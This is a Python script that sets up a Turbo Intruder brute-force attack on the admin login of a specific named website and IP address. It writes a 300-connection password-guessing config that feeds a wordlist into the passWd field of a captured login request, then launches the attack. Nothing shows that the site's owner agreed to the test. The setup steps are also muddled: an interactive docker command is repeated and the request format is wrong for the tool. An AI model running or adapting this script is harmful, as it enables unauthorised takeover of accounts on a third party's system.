import subprocess

# Install Java docker using this command
subprocess.run(["docker", "run", "-it", "bellsoft/liberica-openjdk-alpine"])
# Create a file named basic.py with the given data
with open("basic.py", "w") as f:
    f.write('''def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=300,
                           requestsPerConnection=100,
                           pipeline=False
                          )
    for word in open('dict.txt'):
        engine.queue(target.req, word.rstrip())

def handleResponse(req, interesting):
    if req.length != 424:
        table.add(req)''')

# Download the file turbo-intruder-all.jar from GitHub
subprocess.run(["wget", "https://github.com/PortSwigger/turbo-intruder/releases/download/v0.2/turbo-intruder-all.jar"])

# Create a file named request.txt with the given data
with open("request.txt", "w") as f:
    f.write('''Request URL: http://agent.bluedragon777.com/ashx/login/Login.ashx HTTP/1.1
method: POST
Address: 52.250.3.156
Headers:
* Accept application/json, text/javascript, */*
* Accept-Encoding gzip, deflate
* Accept-Language en-US,en;q=0.9
* Connection keep-alive
* Content-Length 64
* Content-Type application/x-www-form-urlencoded
* Host agent.bluedragon777.com
* Origin http://agent.bluedragon777.com
* Referer http://agent.bluedragon777.com/
* User-Agent Mozilla/5.0 (iPad; CPU OS 15_7_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.6.4 Mobile/15E148 Safari/604.1
* X-Requested-With XMLHttpRequest
Post data (64 bytes)
Type: application/x-www-form-urlencoded
action=login&userName=admin&passWd=%s&country=N/A&city=N/A''')

# Install Java docker using this command
subprocess.run(["docker", "run", "-it", "bellsoft/liberica-openjdk-alpine"])
subprocess.run(["java", "-jar", "turbo-intruder-all.jar", "basic.py", "request.txt"])
